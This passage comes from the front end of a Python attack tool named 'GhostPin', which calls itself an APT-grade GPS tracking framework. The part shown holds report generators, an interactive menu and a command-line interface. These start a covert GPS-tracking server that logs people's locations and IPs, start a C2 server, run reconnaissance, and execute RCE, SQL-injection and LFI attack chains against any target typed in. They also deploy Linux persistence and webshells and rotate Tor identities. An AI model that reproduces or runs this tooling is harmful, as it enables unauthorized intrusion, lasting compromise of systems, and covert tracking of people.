                f'<td>{gps.get("timestamp", "N/A")[:19]}</td></tr>'
                for gps in data.get('gps_data', [])[-20:]
            ])}
        </table>
        
        <h2>Open Ports & Services</h2>
        <table>
            <tr>
                <th>Port</th>
                <th>Service</th>
                <th>Product</th>
                <th>Version</th>
            </tr>
            {''.join([
                f'<tr><td>{port}</td>'
                f'<td>{service.get("name", "unknown")}</td>'
                f'<td>{service.get("product", "")}</td>'
                f'<td>{service.get("version", "")}</td></tr>'
                for port, service in data.get('services', {}).items()
            ])}
        </table>
        
        <h2>Vulnerabilities</h2>
        {''.join([
            f'<div class="vuln"><strong>{v.get("type", "Unknown")}</strong> - {v.get("severity", "unknown")}<br>'
            f'{v.get("description", "")}</div>'
            for v in data.get('vulnerabilities', [])
        ])}
        
        <h2>Attack Surface</h2>
        {''.join([
            f'<div class="info"><strong>{k.replace("_", " ").title()}</strong>: {v}</div>'
            for k, v in data.get('attack_surface', {}).items()
        ])}
    </div>
</body>
</html>
"""
            with open(filename, 'w') as f:
                f.write(html)
            return True
        except:
            return False
    
    def generate_json(self, data: Dict, filename: str = "apt_report.json") -> bool:
        """Generate JSON report"""
        try:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            return True
        except:
            return False

#===============================================================================
# ENHANCED GHOSTPIN MAIN
#===============================================================================

class GhostPinEnhanced:
    """Enhanced GhostPin with all features"""
    
    def __init__(self):
        self.server = TrackingServer()
        self.c2_server = C2Server()
        self.proxy_manager = ProxyManager()
        self.persistence = EnhancedPersistence(self.c2_server)
        self.reporting = EnhancedReporting()
        self.current_profile = None
        self.running = True
        
        # Tracking server reference
        self.tracking_server = None
        
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.RED)
        self.running = False
        if self.c2_server:
            self.c2_server.stop()
        if self.tracking_server:
            self.tracking_server.stop()
        sys.exit(0)
    
    def _banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{Colors.WHITE}
{Colors.YELLOW}    ENHANCED APT-Grade GPS Tracking Framework v{VERSION}{Colors.WHITE}
{Colors.RED}    Author: {AUTHOR} | License: {LICENSE}{Colors.WHITE}
{Colors.DIM}    [+] Complete APT | C2 | Persistence | GPS Tracking{Colors.WHITE}
"""
        print(banner)
    
    def _menu(self):
        print(f"""
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - Enhanced APT Framework{Colors.WHITE}
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.GREEN}[1]{Colors.WHITE} Start Tracking Server (GPS)
{Colors.GREEN}[2]{Colors.WHITE} Start C2 Server
{Colors.GREEN}[3]{Colors.WHITE} Run APT Reconnaissance
{Colors.GREEN}[4]{Colors.WHITE} Build & Execute Attack Chain
{Colors.GREEN}[5]{Colors.WHITE} Deploy Persistence
{Colors.GREEN}[6]{Colors.WHITE} Deploy Webshell
{Colors.GREEN}[7]{Colors.WHITE} View GPS Data
{Colors.GREEN}[8]{Colors.WHITE} Generate Report
{Colors.GREEN}[9]{Colors.WHITE} Tor/Proxy Settings
{Colors.RED}[10]{Colors.WHITE} Exit
""")
    
    def _run_apt_recon(self):
        target = input(f"{Colors.CYAN}[>] Target domain/IP: {Colors.WHITE}").strip()
        if not target:
            return
        
        cprint("[*] Running APT reconnaissance...", Colors.BLUE)
        recon = APTReconnaissance(target)
        self.current_profile = recon.full_recon()
        
        # Save profile
        filename = f"profile_{target}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.current_profile.to_dict(), f, indent=2)
        cprint(f"[+] Profile saved to {filename}", Colors.GREEN)
        
        # Display summary
        profile = self.current_profile
        cprint(f"\n[+] Reconnaissance Summary:", Colors.GREEN)
        cprint(f"  Subdomains: {len(profile.subdomains)}", Colors.DIM)
        cprint(f"  Open Ports: {len(profile.open_ports)}", Colors.DIM)
        cprint(f"  Services: {len(profile.services)}", Colors.DIM)
        cprint(f"  Web Apps: {len(profile.web_applications)}", Colors.DIM)
        cprint(f"  Cloud Resources: {len(profile.cloud_resources)}", Colors.DIM)
        
        if profile.vulnerabilities:
            cprint(f"  Potential Vulnerabilities: {len(profile.vulnerabilities)}", Colors.DIM)
    
    def _build_attack_chain(self):
        if not self.current_profile:
            target = input(f"{Colors.CYAN}[>] Target: {Colors.WHITE}").strip()
            if not target:
                return
            cprint("[*] Running reconnaissance first...", Colors.BLUE)
            recon = APTReconnaissance(target)
            self.current_profile = recon.full_recon()
        
        exploit = RealExploitEngine(self.current_profile)
        chain = exploit.build_attack_chain()
        
        cprint(f"\n[+] Attack Chain ({len(chain)} vectors):", Colors.GREEN)
        for i, vector in enumerate(chain, 1):
            severity = vector.get('severity', 'unknown')
            color = Colors.RED if severity == 'critical' else Colors.YELLOW if severity == 'high' else Colors.WHITE
            cprint(f"\n{color}[{i}] {vector.get('technique', 'Unknown')}{Colors.WHITE}")
            cprint(f"    CVE: {vector.get('cve', 'N/A')}", Colors.DIM)
            cprint(f"    Severity: {severity}", Colors.DIM)
            cprint(f"    Confidence: {vector.get('confidence', 0.5)}", Colors.DIM)
        
        execute = input(f"\n{Colors.YELLOW}[>] Execute attacks? (y/N): {Colors.WHITE}").strip().lower()
        if execute == 'y':
            for vector in chain:
                # Execute real attack based on type
                if 'rce' in vector.get('technique', '').lower():
                    result = exploit.exploit_rce(
                        vector.get('url', f"http://{self.current_profile.target}"),
                        'cmd', 'id'
                    )
                elif 'sqli' in vector.get('technique', '').lower():
                    result = exploit.exploit_sqli(
                        vector.get('url', f"http://{self.current_profile.target}"),
                        'id'
                    )
                else:
                    result = exploit.exploit_lfi(
                        vector.get('url', f"http://{self.current_profile.target}"),
                        'file'
                    )
                
                if result.get('success'):
                    cprint(f"[+] {vector.get('technique')} - SUCCESS", Colors.GREEN)
                    if result.get('output'):
                        cprint(f"    Output: {result['output'][:200]}", Colors.DIM)
                else:
                    cprint(f"[-] {vector.get('technique')} - FAILED", Colors.RED)
    
    def _deploy_persistence(self):
        if not self.current_profile:
            target = input(f"{Colors.CYAN}[>] Target: {Colors.WHITE}").strip()
            if not target:
                return
            cprint("[*] Running reconnaissance first...", Colors.BLUE)
            recon = APTReconnaissance(target)
            self.current_profile = recon.full_recon()
        
        username = input(f"{Colors.CYAN}[>] Username: {Colors.WHITE}").strip()
        password = input(f"{Colors.CYAN}[>] Password: {Colors.WHITE}").strip()
        payload = input(f"{Colors.CYAN}[>] Payload path: {Colors.WHITE}").strip() or "/bin/bash"
        
        if not username:
            cprint("[-] Username required", Colors.RED)
            return
        
        platform_type = input(f"{Colors.CYAN}[>] Platform (linux/windows/all): {Colors.WHITE}").strip().lower() or "linux"
        
        if platform_type in ['linux', 'all']:
            result = self.persistence.deploy_linux(
                self.current_profile.target, username, password, payload
            )
            cprint(f"\n[+] Linux persistence: {len(result.get('methods', []))} methods", Colors.GREEN)
        
        if platform_type in ['windows', 'all']:
            cprint("[*] Windows persistence...", Colors.BLUE)
            # Windows persistence would be implemented similarly
    
    def _deploy_webshell(self):
        if not self.current_profile:
            target = input(f"{Colors.CYAN}[>] Target: {Colors.WHITE}").strip()
            if not target:
                return
            cprint("[*] Running reconnaissance first...", Colors.BLUE)
            recon = APTReconnaissance(target)
            self.current_profile = recon.full_recon()
        
        port = int(input(f"{Colors.CYAN}[>] Port (80): {Colors.WHITE}").strip() or "80")
        
        exploit = RealExploitEngine(self.current_profile)
        result = exploit.upload_webshell(self.current_profile.target, port)
        
        if result['success']:
            cprint(f"[+] Webshell deployed: {result['url']}", Colors.GREEN)
        else:
            cprint("[-] Webshell deployment failed", Colors.RED)
    
    def _view_gps_data(self):
        if not self.tracking_server or not self.tracking_server.tracking_data:
            cprint("[!] No GPS data available", Colors.YELLOW)
            return
        
        data = self.tracking_server.tracking_data
        stats = self.tracking_server.stats
        
        cprint(f"\n[+] GPS Tracking Data (Total: {stats['total']}, Unique: {len(stats['unique'])})", Colors.GREEN)
        
        for i, record in enumerate(data[-10:], 1):
            lat = record.get('lat', 'N/A')
            lng = record.get('lng', 'N/A')
            token = record.get('token', 'N/A')
            ip = record.get('source_ip', 'N/A')
            
            cprint(f"\n  [{i}] Token: {token}", Colors.YELLOW)
            cprint(f"      Location: {lat}, {lng}", Colors.CYAN)
            cprint(f"      IP: {ip}", Colors.DIM)
            
            if lat != 'N/A' and lng != 'N/A':
                maps = f"https://www.google.com/maps?q={lat},{lng}"
                cprint(f"      Map: {maps}", Colors.BLUE)
    
    def _generate_report(self):
        if not self.current_profile:
            cprint("[!] Run reconnaissance first", Colors.RED)
            return
        
        # Build report data
        data = {
            'timestamp': datetime.now().isoformat(),
            'version': VERSION,
            'author': AUTHOR,
            'target': self.current_profile.target,
            'ip_addresses': self.current_profile.ip_addresses,
            'subdomains': self.current_profile.subdomains,
            'open_ports': self.current_profile.open_ports,
            'services': self.current_profile.services,
            'technologies': self.current_profile.technologies,
            'vulnerabilities': self.current_profile.vulnerabilities,
            'attack_surface': self.current_profile.attack_surface,
            'gps_data': self.tracking_server.tracking_data if self.tracking_server else [],
            'c2_beacons': self.c2_server.beacons if self.c2_server else []
        }
        
        # Generate reports
        self.reporting.generate_pdf(data, "apt_report.pdf")
        self.reporting.generate_html(data, "apt_report.html")
        self.reporting.generate_json(data, "apt_report.json")
        
        cprint("[+] Reports generated in all formats", Colors.GREEN)
    
    def _tor_settings(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}Tor/Proxy Settings{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
Tor Available: {self.proxy_manager.tor_available}
Proxies Loaded: {len(self.proxy_manager.proxies)}
""")
        
        print("[1] Renew Tor Identity")
        print("[2] Load Proxies from File")
        print("[3] Add Proxy")
        print("[4] Back")
        
        choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
        
        if choice == '1':
            if self.proxy_manager.renew_tor_identity():
                cprint("[+] Tor identity renewed", Colors.GREEN)
            else:
                cprint("[-] Tor identity renewal failed", Colors.RED)
        elif choice == '2':
            filename = input(f"{Colors.CYAN}[>] Proxy file: {Colors.WHITE}").strip()
            self.proxy_manager.load_proxies_from_file(filename)
        elif choice == '3':
            proxy = input(f"{Colors.CYAN}[>] Proxy (ip:port): {Colors.WHITE}").strip()
            self.proxy_manager.add_proxy(proxy)
            cprint("[+] Proxy added", Colors.GREEN)
    
    def run(self):
        self._banner()
        
        while self.running:
            self._menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                port = int(input(f"{Colors.CYAN}[>] Port (443): {Colors.WHITE}").strip() or "443")
                ssl_enabled = input(f"{Colors.CYAN}[>] Enable SSL? (Y/n): {Colors.WHITE}").strip().lower() != 'n'
                self.tracking_server = TrackingServer()
                self.tracking_server.start(port, ssl_enabled)
            
            elif choice == '2':
                port = int(input(f"{Colors.CYAN}[>] Port (8080): {Colors.WHITE}").strip() or "8080")
                self.c2_server.port = port
                self.c2_server.start()
            
            elif choice == '3':
                self._run_apt_recon()
            
            elif choice == '4':
                self._build_attack_chain()
            
            elif choice == '5':
                self._deploy_persistence()
            
            elif choice == '6':
                self._deploy_webshell()
            
            elif choice == '7':
                self._view_gps_data()
            
            elif choice == '8':
                self._generate_report()
            
            elif choice == '9':
                self._tor_settings()
            
            elif choice == '10':
                cprint("[*] Shutting down...", Colors.RED)
                self.running = False
                if self.c2_server:
                    self.c2_server.stop()
                if self.tracking_server:
                    self.tracking_server.stop()
                cprint("[+] Goodbye!", Colors.GREEN)
                sys.exit(0)
            
            else:
                cprint("[-] Invalid option", Colors.RED)

#===============================================================================
# MAIN
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description=f"GhostPin v{VERSION} - Enhanced APT-Grade Framework",
        epilog=f"Author: {AUTHOR} | License: {LICENSE}"
    )
    
    parser.add_argument("--server", action="store_true", help="Start tracking server")
    parser.add_argument("--c2", action="store_true", help="Start C2 server")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("--recon", help="Run APT reconnaissance")
    parser.add_argument("--attack", help="Build and execute attack chain")
    parser.add_argument("--persist", help="Deploy persistence on target")
    parser.add_argument("--webshell", help="Deploy webshell on target")
    parser.add_argument("--report", help="Generate report for target")
    parser.add_argument("--tor", action="store_true", help="Enable Tor")
    parser.add_argument("--output", help="Output file")
    
    args = parser.parse_args()
    
    if args.tor:
        proxy = ProxyManager()
        if proxy.tor_available:
            cprint("[+] Tor enabled", Colors.GREEN)
        else:
            cprint("[!] Tor not available", Colors.RED)
    
    if args.server:
        server = TrackingServer()
        server.start(args.port or 443, ssl_enabled=True)
        cprint("[+] Server running. Press Ctrl+C to stop", Colors.GREEN)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    if args.c2:
        c2 = C2Server(port=args.port or 8080)
        c2.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            c2.stop()
        sys.exit(0)
    
    if args.recon:
        recon = APTReconnaissance(args.recon)
        profile = recon.full_recon()
        
        output = args.output or f"profile_{args.recon}_{int(time.time())}.json"
        with open(output, 'w') as f:
            json.dump(profile.to_dict(), f, indent=2)
        cprint(f"[+] Profile saved to {output}", Colors.GREEN)
        sys.exit(0)
    
    if args.attack:
        recon = APTReconnaissance(args.attack)
        profile = recon.full_recon()
        
        exploit = RealExploitEngine(profile)
        chain = exploit.build_attack_chain()
        
        for vector in chain[:3]:
            result = exploit.exploit_rce(f"http://{args.attack}", 'cmd', 'id')
            if result['success']:
                cprint(f"[+] RCE successful: {result['output'][:200]}", Colors.GREEN)
        sys.exit(0)
    
    if args.persist:
        persistence = EnhancedPersistence()
        parts = args.persist.split(',')
        if len(parts) >= 3:
            target, username, password = parts[0], parts[1], parts[2]
            payload = parts[3] if len(parts) > 3 else "/bin/bash"
            result = persistence.deploy_linux(target, username, password, payload)
            print(json.dumps(result, indent=2))
        sys.exit(0)
    
    if args.webshell:
        parts = args.webshell.split(',')
        if len(parts) >= 1:
            target = parts[0]
            port = int(parts[1]) if len(parts) > 1 else 80
            exploit = RealExploitEngine(APTTargetProfile(target))
            result = exploit.upload_webshell(target, port)
            print(json.dumps(result, indent=2))
        sys.exit(0)
    
    if args.report:
        recon = APTReconnaissance(args.report)
        profile = recon.full_recon()
        
        reporting = EnhancedReporting()
        data = profile.to_dict()
        data['timestamp'] = datetime.now().isoformat()
        data['version'] = VERSION
        data['author'] = AUTHOR
        
        reporting.generate_pdf(data, f"report_{args.report}.pdf")
        reporting.generate_html(data, f"report_{args.report}.html")
        reporting.generate_json(data, f"report_{args.report}.json")
        
        cprint("[+] Reports generated", Colors.GREEN)
        sys.exit(0)
    
    # Interactive mode
    app = GhostPinEnhanced()
    app.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        import traceback
        traceback.print_exc()
        sys.exit(1)
